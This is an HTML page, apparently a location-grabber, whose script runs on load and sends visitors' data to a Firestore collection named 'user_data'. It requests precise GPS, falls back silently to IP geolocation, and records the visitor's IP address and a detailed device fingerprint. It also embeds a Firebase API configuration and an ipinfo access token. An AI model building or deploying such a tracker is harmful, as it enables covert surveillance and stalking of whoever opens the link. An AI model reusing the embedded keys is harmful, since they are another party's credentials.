<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home Page</title>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
            authDomain: "locationsaver-b9997.firebaseapp.com",
            projectId: "locationsaver-b9997",
            storageBucket: "locationsaver-b9997.appspot.com",
            messagingSenderId: "675975845355",
            appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
            measurementId: "G-WJJY3Q2M8E"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        async function getIPAddress() {
            try {
                const response = await fetch("https://api64.ipify.org?format=json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP address:", error);
                return "Unknown";
            }
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || "Unknown",
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                onlineStatus: navigator.onLine,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                pageURL: window.location.href
            };
        }

        function getGPSLocation(callback) {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const ipAddress = await getIPAddress();
                    callback({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        ipAddress: ipAddress,
                        type: "GPS"
                    });
                }, (error) => {
                    console.warn("GPS denied, using IP location instead.");
                    getIPLocation(callback);
                }, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            } else {
                console.warn("GPS not supported.");
                getIPLocation(callback);
            }
        }

        function getIPLocation(callback) {
            fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
                .then(response => response.json())
                .then(data => {
                    callback({
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        latitude: data.loc.split(",")[0],
                        longitude: data.loc.split(",")[1],
                        org: data.org,
                        postal: data.postal || "Unknown",
                        timezone: data.timezone || "Unknown",
                        type: "IP"
                    });
                })
                .catch(error => {
                    console.error("Error fetching IP location:", error);
                    callback(null);
                });
        }

        getGPSLocation(async (locationData) => {
            const deviceInfo = getDeviceInfo();
            const timestamp = new Date();
            const userData = {
                location: locationData || "Unknown",
                device: deviceInfo,
                timestamp: timestamp
            };
            
            try {
                await addDoc(collection(db, "user_data"), userData);
                console.log("‚úÖ User data saved:", userData);
            } catch (error) {
                console.error("‚ùå Error saving user data:", error);
            }
        });
    </script>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8f9fa;
            color: #333;
            padding: 50px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        h1 {
            font-size: 36px;
            margin-bottom: 10px;
        }
        p {
            font-size: 18px;
            margin-bottom: 20px;
        }
        .icon {
            font-size: 80px;
            color: #28a745;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="icon">üìç</div>
        <h1>Tracking Your Location</h1>
        <p>Your location data is being recorded securely.</p>
        <button onclick="location.reload()">Refresh</button>
    </div>
</body>

</html>
